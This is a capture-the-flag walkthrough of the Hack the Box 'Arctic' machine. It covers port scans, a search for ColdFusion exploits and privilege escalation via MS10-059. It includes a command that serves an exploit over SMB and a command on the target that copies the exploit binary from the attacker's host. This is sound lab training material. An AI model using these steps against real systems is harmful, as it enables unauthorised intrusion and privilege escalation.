# Hack the Box - Arctic

```CSS
Machine IP: 10.10.10.11 - Windows
OS Name: Microsoft Windows Server 2008 R2 Standard
OS Version: 6.1.7600 N/A Build 7600
System Type: x64
Vulnerabilities: Adobe Cloud Fusion 8 | Windows Kernel Exploit MS10-059
```

## Reconnaisance
```CSS
▶ nmap -Pn -sS -p- 10.10.10.11 -T4 --min-rate 1000 -oN surface.nmap

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 13:09 IST
Nmap scan report for 10.10.10.11
Host is up (0.097s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```

```css
▶ nmap -sC -sV -p 135,8500,49154 10.10.10.11 -oN deep.nmap

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 13:11 IST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.10.11
Host is up (0.086s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.00 seconds
```
---

## Application Mapping

![image](https://user-images.githubusercontent.com/83878909/229273435-61068519-cbd8-4c2c-be4f-6dd3c1a87e15.png)
![image](https://user-images.githubusercontent.com/83878909/229273524-6f7ba081-63f5-4fe6-9b4e-d228ef07ec08.png)
![image](https://user-images.githubusercontent.com/83878909/229273721-64bd7f7c-3270-4b3c-99d7-2cb0791a8343.png)

---

## Search for Exploits
```CSS
▶ searchsploit ColdFusion
```
![image](https://user-images.githubusercontent.com/83878909/229282725-1fd751df-4992-44d4-9c8a-c5d2527867c3.png)

### Modify the Exploit Code
![image](https://user-images.githubusercontent.com/83878909/229283393-0791183b-a971-4d68-a64e-32e7e652d8f8.png)

## User Access
![image](https://user-images.githubusercontent.com/83878909/229284344-ca6b43e3-36da-4815-9b62-4432377668eb.png)

---

## Privilege Escalation
### System Information Gathering
![image](https://user-images.githubusercontent.com/83878909/229284588-f0e96832-3491-4d2b-a027-54795caa0a55.png)

  - The target machine's kernel is vulnerable to **MS10-059**.
  - Exploit [(Link)](https://github.com/egre55/windows-kernel-exploits)

### Exploit
  - Tranfer exploit code to target machine.
```CSS
▶ impacket-smbserver share $(pwd) -smb2support 
```
  - Execute the exploit.
```CSS
C:\ColdFusion8\runtime\bin>copy \\10.10.14.34\share\chimichurri.exe
```
![image](https://user-images.githubusercontent.com/83878909/229303301-4b8fef70-a000-42f7-9b72-2dc8c7af037a.png)

## Root
![image](https://user-images.githubusercontent.com/83878909/229306240-86174770-a64c-4935-a387-669ac07555c3.png)

---
